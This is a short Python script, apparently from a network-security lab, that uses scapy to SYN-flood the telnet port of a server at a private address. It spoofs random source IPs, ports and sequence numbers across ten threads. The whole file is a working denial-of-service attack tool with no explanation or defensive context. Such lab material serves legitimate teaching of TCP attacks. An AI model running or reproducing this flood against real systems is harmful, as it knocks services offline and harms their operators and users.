#!/usr/bin/python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import _thread

def syn_flood():
	ip = IP(dst="172.17.0.3")			# Server IP
	tcp = TCP(dport=23, flags='S')		# Server telnet port
	pkt = ip/tcp
	while True:
	    pkt[IP].src = str(IPv4Address(getrandbits(32)))	# Random source IP
	    pkt[TCP].sport = getrandbits(16) 				# Random source port
	    pkt[TCP].seq = getrandbits(32)    				# Random sequence number
	    send(pkt, verbose = 0)

try:
	for i in range(0, 10):
		_thread.start_new_thread(syn_flood, ()) 		# Create multi-thread to attack
except:
	print("Create Thread Error.")

while 1:
   pass
